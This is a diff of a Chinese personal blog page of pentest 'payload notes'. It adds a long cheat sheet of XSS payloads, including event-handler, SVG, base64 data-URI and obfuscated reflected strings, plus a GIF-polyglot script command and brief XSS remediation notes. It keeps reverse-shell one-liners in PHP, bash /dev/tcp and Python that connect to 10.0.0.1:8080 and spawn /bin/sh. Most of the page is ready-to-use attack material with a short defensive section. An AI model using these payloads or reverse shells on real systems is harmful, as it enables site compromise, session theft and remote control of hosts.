@@ -21,16 +21,16 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.21.1","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="XXS简单payload注：html解析HTML 实体编码 ​	例如： 1&amp;quot;   html解码成	&quot;  注：JavaScript Unicode 转义（\uXXXX） 和 URL 编码（%XX） xxs需要注意被墙了可以尝试从转义或者解析角度注入 当然文件预览的方向也可以尝试 可以通过网址来查看以前大佬们提交的漏洞">
+    <meta name="description" content="XXS简单payload自动弹窗优先级 1svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video&#x2F;audio &gt; details &gt; marquee &gt; math">
 <meta property="og:type" content="article">
 <meta property="og:title" content="payload记录">
 <meta property="og:url" content="http://example.com/2025/04/24/payload%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="乌篷船的博客">
-<meta property="og:description" content="XXS简单payload注：html解析HTML 实体编码 ​	例如： 1&amp;quot;   html解码成	&quot;  注：JavaScript Unicode 转义（\uXXXX） 和 URL 编码（%XX） xxs需要注意被墙了可以尝试从转义或者解析角度注入 当然文件预览的方向也可以尝试 可以通过网址来查看以前大佬们提交的漏洞">
+<meta property="og:description" content="XXS简单payload自动弹窗优先级 1svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video&#x2F;audio &gt; details &gt; marquee &gt; math">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/image/xss/expected_request.png">
 <meta property="article:published_time" content="2025-04-23T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-12-17T06:18:50.892Z">
+<meta property="article:modified_time" content="2025-12-25T07:11:53.009Z">
 <meta property="article:author" content="乌篷船">
 <meta property="article:tag" content="payload">
 <meta name="twitter:card" content="summary">
@@ -143,7 +143,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXS"><span class="nav-number">1.</span> <span class="nav-text">XXS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95payload"><span class="nav-number">1.1.</span> <span class="nav-text">简单payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">经典示例：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#get%E5%8F%82%E6%95%B0%E5%8F%98%E6%9B%B4"><span class="nav-number">1.1.1.0.1.</span> <span class="nav-text">get参数变更</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E5%90%8D%E7%A7%B0%E5%8F%98%E6%9B%B4"><span class="nav-number">1.1.1.0.2.</span> <span class="nav-text">图片名称变更</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81xss%E7%9A%84payload"><span class="nav-number">1.1.1.0.3.</span> <span class="nav-text">常见xss的payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8B%A5%E5%93%8D%E5%BA%94%E5%8C%85%E5%AD%98%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%A4%B4-application-javascript"><span class="nav-number">1.1.2.</span> <span class="nav-text">若响应包存在请求头     application&#x2F;javascript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8B%A5%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8%E9%A2%84%E8%A7%88%E5%92%8C%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.1.3.</span> <span class="nav-text">若页面存在预览和上传</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Reverse-Shell"><span class="nav-number">2.</span> <span class="nav-text">PHP Reverse Shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse-Shell"><span class="nav-number">3.</span> <span class="nav-text">Reverse Shell</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XXS"><span class="nav-number">1.</span> <span class="nav-text">XXS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95payload"><span class="nav-number">1.1.</span> <span class="nav-text">简单payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81xss%E7%9A%84payload"><span class="nav-number">1.1.0.0.1.</span> <span class="nav-text">常见xss的payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8B%A5%E5%93%8D%E5%BA%94%E5%8C%85%E5%AD%98%E5%9C%A8%E8%AF%B7%E6%B1%82%E5%A4%B4-application-javascript"><span class="nav-number">1.1.1.</span> <span class="nav-text">若响应包存在请求头     application&#x2F;javascript</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8B%A5%E9%A1%B5%E9%9D%A2%E5%AD%98%E5%9C%A8%E9%A2%84%E8%A7%88%E5%92%8C%E4%B8%8A%E4%BC%A0"><span class="nav-number">1.1.2.</span> <span class="nav-text">若页面存在预览和上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%8F%E5%85%B8%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="nav-number">1.1.3.</span> <span class="nav-text">经典示例：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#get%E5%8F%82%E6%95%B0%E5%8F%98%E6%9B%B4"><span class="nav-number">1.1.3.0.1.</span> <span class="nav-text">get参数变更</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9B%BE%E7%89%87%E5%90%8D%E7%A7%B0%E5%8F%98%E6%9B%B4"><span class="nav-number">1.1.3.0.2.</span> <span class="nav-text">图片名称变更</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.2.</span> <span class="nav-text">xss修复建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A0-%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E6%9E%90%E8%A1%8C%E4%B8%BA"><span class="nav-number">1.2.1.</span> <span class="nav-text">① 编码与解析行为</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A1-%E5%B1%9E%E6%80%A7%E7%99%BD%E5%90%8D%E5%8D%95%EF%BC%88%E9%9D%9E%E5%B8%B8%E4%B8%A5%E6%A0%BC%EF%BC%89"><span class="nav-number">1.2.2.</span> <span class="nav-text">② 属性白名单（非常严格）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A2-%E5%8D%8F%E8%AE%AE%E4%B8%8E%E8%B5%84%E6%BA%90%E7%AD%96%E7%95%A5"><span class="nav-number">1.2.3.</span> <span class="nav-text">③ 协议与资源策略</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A3-Flash-%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.4.</span> <span class="nav-text">④ Flash 的处理方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A4-%E5%9F%9F%E5%90%8D%E7%99%BD%E5%90%8D%E5%8D%95-CSP"><span class="nav-number">1.2.5.</span> <span class="nav-text">⑤ 域名白名单 &#x2F; CSP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Reverse-Shell"><span class="nav-number">2.</span> <span class="nav-text">PHP Reverse Shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse-Shell"><span class="nav-number">3.</span> <span class="nav-text">Reverse Shell</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -249,7 +249,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2025-12-17 14:18:50" itemprop="dateModified" datetime="2025-12-17T14:18:50+08:00">2025-12-17</time>
+      <time title="修改时间：2025-12-25 15:11:53" itemprop="dateModified" datetime="2025-12-25T15:11:53+08:00">2025-12-25</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -268,14 +268,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.5k</span>
+      <span>4.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>8 分钟</span>
     </span>
 </div>
 
@@ -285,7 +285,16 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p>注：html解析<strong>HTML 实体编码</strong></p>
+    <div class="post-body" itemprop="articleBody"><h1 id="XXS"><a href="#XXS" class="headerlink" title="XXS"></a>XXS</h1><h2 id="简单payload"><a href="#简单payload" class="headerlink" title="简单payload"></a>简单payload</h2><p><strong>自动弹窗优先级</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svg &gt; img &gt; iframe &gt; object &gt; embed &gt; video/audio &gt; details &gt; marquee &gt; math</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加载弹窗</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#加密payload</span><br><span class="line">   &lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br><span class="line">   #svg内嵌代码1</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;animate onbegin=alert(1) attributeName=x /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码2</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;set onbegin=alert(1) /&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #svg内嵌代码3</span><br><span class="line">&lt;svg&gt;</span><br><span class="line"> 		&lt;foreignObject onload=alert(1)&gt;&lt;/foreignObject&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">   #点击  # JS 协议</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line">       </span><br><span class="line">   #鼠标移动代码2</span><br><span class="line">   &lt;math&gt;</span><br><span class="line">     &lt;mtext onmouseover=alert(1)&gt;X&lt;/mtext&gt;</span><br><span class="line">   &lt;/math&gt;</span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line">   #非 常见标签</span><br><span class="line">       #万能嵌入器#早期网页：&lt;embed src=&quot;movie.swf&quot;&gt;</span><br><span class="line">       &lt;embed src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">       #详细信息</span><br><span class="line">       &lt;details open ontoggle=alert(1)&gt;</span><br><span class="line">       #h5视频标签</span><br><span class="line">       &lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">       #h5音频标签</span><br><span class="line">       &lt;audio src=x onerror=alert(1)&gt;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
+
+<p>注：html解析<strong>HTML 实体编码</strong></p>
 <p>​	例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;quot;   html解码成	&quot;</span><br></pre></td></tr></table></figure>
 
@@ -293,8 +302,13 @@
 <p>xxs需要注意被墙了可以尝试从转义或者解析角度注入</p>
 <p>当然文件预览的方向也可以尝试</p>
 <p>可以通过<a target="_blank" rel="noopener" href="https://hackerone.com/hacktivity/cwe_discovery?id=CWE-79">网址</a>来查看以前大佬们提交的漏洞</p>
-<span id="more"></span>
+<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
+<p>用ai改了一下，python3也可以用</p>
+<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
+<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a target="_blank" rel="noopener" href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
 <h3 id="经典示例："><a href="#经典示例：" class="headerlink" title="经典示例："></a>经典示例：</h3><h5 id="get参数变更"><a href="#get参数变更" class="headerlink" title="get参数变更"></a>get参数变更</h5><p>示例poc：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.xxx.com/employers/sem-dual-lp/?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e</span><br></pre></td></tr></table></figure>
 
@@ -305,24 +319,52 @@
 
 <h5 id="图片名称变更"><a href="#图片名称变更" class="headerlink" title="图片名称变更"></a>图片名称变更</h5><p>payload:       \ “&gt;&lt;img src&#x3D;1 onerror&#x3D;&quot; URL&#x3D;String;</p>
 <p><img src="/../image/xss/expected_request.png"></p>
-<h5 id="常见xss的payload"><a href="#常见xss的payload" class="headerlink" title="常见xss的payload"></a>常见xss的payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">   #标签外常用#base64加密</span><br><span class="line">   &quot;&lt;object data=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&gt;&lt;/object&gt;&quot;</span><br><span class="line">   #img#强制错误弹</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #svg#强制错误弹</span><br><span class="line">   &lt;svg onload=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">   #点击</span><br><span class="line">   &lt;a href=&quot;javascript:alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line">   &lt;a data-url=&quot;&quot; onclick=&quot;alert(&#x27;xxx&#x27;)&quot;&gt;xss&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">   #normal</span><br><span class="line">   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">   #鼠标移动</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot;&gt;hover me&lt;/a&gt;</span><br><span class="line">   &lt;a onmousemove=&quot;alert(1)&quot; style=&quot;display:block;width:200px;height:50px;background:red&quot;&gt;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">   #特定标签</span><br><span class="line">   &lt;iframe src=about:blank onload=alert(1)&gt;&lt;/iframe&gt;</span><br><span class="line">   </span><br><span class="line">   #强制本页无限弹窗</span><br><span class="line">   #聚焦时弹xss，强制聚焦</span><br><span class="line">   &lt;input autofocus onfocus=alert(1)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="xss修复建议"><a href="#xss修复建议" class="headerlink" title="xss修复建议"></a>xss修复建议</h2><p>✅和⚠️表示仍可以优化</p>
+<h3 id="①-编码与解析行为"><a href="#①-编码与解析行为" class="headerlink" title="① 编码与解析行为"></a>① 编码与解析行为</h3><ul>
+<li>✅ <strong>HTML 实体会被换元（<code>&amp;#60;</code> → <code>&lt;</code>）</strong></li>
+<li>❌ <strong>URL 编码不会被解析（<code>%3C</code> 不会还原）</strong></li>
+<li>❌ <strong>实体不会再被二次解析</strong></li>
+<li>⚠️ <strong>只有在“属性上下文”里才会被解析一次</strong></li>
+</ul>
+<p>👉 这么改的用途：</p>
+<blockquote>
+<p><strong>不存在通用 DOM 二次解析链</strong></p>
+</blockquote>
+<hr>
+<h3 id="②-属性白名单（非常严格）"><a href="#②-属性白名单（非常严格）" class="headerlink" title="② 属性白名单（非常严格）"></a>② 属性白名单（非常严格）</h3><ul>
+<li>❌ 除 <code>href</code> &#x2F; <code>src</code> 外，其余属性全部被过滤</li>
+<li>❌ 所有 <code>on*</code> 事件被灭</li>
+<li>❌ style &#x2F; data-* &#x2F; 自定义属性被灭</li>
+</ul>
+<p>👉 这是 <strong>属性级白名单 sanitizer</strong></p>
+<hr>
+<h3 id="③-协议与资源策略"><a href="#③-协议与资源策略" class="headerlink" title="③ 协议与资源策略"></a>③ 协议与资源策略</h3><ul>
+<li>❌ <code>javascript:</code> ❌</li>
+<li>❌ <code>data:</code> ❌</li>
+<li>❌ URL 解码后再判断（说明是 parse 后校验）</li>
+<li>⚠️ 自动链接存在（URL → <code>&lt;a&gt;</code>）</li>
+<li>❌ 白名单标签</li>
+</ul>
+<hr>
+<h3 id="④-Flash-的处理方式"><a href="#④-Flash-的处理方式" class="headerlink" title="④ Flash 的处理方式"></a>④ Flash 的处理方式</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;movie.swf&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allowscriptaccess</span>=<span class="string">&quot;never&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">allownetworking</span>=<span class="string">&quot;internal&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#常见反射型</span><br><span class="line">	&quot;+onmouseover=alert/*abcd*/`xss`</span><br><span class="line">	</span><br><span class="line">	&quot;&quot;; alert`<span class="number">1</span>`; //&quot;;</span><br><span class="line">	<span class="number">0</span>||alert<span class="variable">%0D`1`//</span></span><br><span class="line"><span class="variable">	%</span><span class="number">0</span>a`$&#123;alert%<span class="number">0</span>D(<span class="number">1</span>)&#125;`</span><br><span class="line">	onload=alert`<span class="number">1</span>` //</span><br><span class="line"></span><br><span class="line">#流程中含有转义步骤</span><br><span class="line">	\u0022\u003b+alert\u00601\u0060\u003b+//</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h3 id="若响应包存在请求头-application-javascript"><a href="#若响应包存在请求头-application-javascript" class="headerlink" title="若响应包存在请求头     application&#x2F;javascript"></a>若响应包存在请求头     application&#x2F;javascript</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通杀测试</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;http://xxxxx/xss/xss.gif&#x27;</span> <span class="attr">alt</span>=<span class="string">&#x27;Smiley face&#x27;</span> <span class="attr">width</span>=<span class="string">&#x27;32&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;32&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>python  jsingif.py  -i  hack.gif  “javascript:alert(‘Power_Liu’)”</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/stayliv3/blog_material/blob/master/csp/jsingif.py">jsingif.py</a></p>
-<p>用ai改了一下，python3也可以用</p>
-<p><a href="../tool/xss/jsingif.py">jsingif.py</a></p>
-<h3 id="若页面存在预览和上传"><a href="#若页面存在预览和上传" class="headerlink" title="若页面存在预览和上传"></a>若页面存在预览和上传</h3><p>则<a target="_blank" rel="noopener" href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/xss/xss.pdf">xss.pdf</a></p>
+<ul>
+<li>❌<code>allowscriptaccess=&quot;never&quot;</code> → <strong>Flash 无法调用 JS</strong></li>
+<li>❌<code>allownetworking=&quot;internal&quot;</code> → <strong>不能外联</strong></li>
+<li>❌MIME 明确限制</li>
+</ul>
+<p>👉 这不是“被动过滤”，而是<strong>主动重写为安全配置</strong></p>
+<h3 id="⑤-域名白名单-CSP"><a href="#⑤-域名白名单-CSP" class="headerlink" title="⑤ 域名白名单 &#x2F; CSP"></a>⑤ 域名白名单 &#x2F; CSP</h3><ul>
+<li>❌只加载的官方脚本</li>
+</ul>
+<p>👉 防止加载外部js导致xss</p>
 <h1 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">8080</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"></span><br><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
 
 
     </div>
@@ -379,7 +421,7 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">134k</span>
+    <span title="站点总字数">136k</span>
   </span>
 </div>
 
